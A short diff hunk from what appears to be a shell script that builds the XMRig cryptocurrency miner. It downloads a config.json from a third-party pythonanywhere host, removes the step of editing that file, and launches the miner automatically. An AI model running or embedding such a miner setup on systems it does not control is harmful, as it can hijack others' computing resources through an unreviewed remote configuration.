@@ -16,6 +16,6 @@ sudo make -j$(nproc)
 
 wget https://taufiqart.pythonanywhere.com/share/config.json
 
-nano config.json
+# nano config.json
 
-#./xmrig
+./xmrig
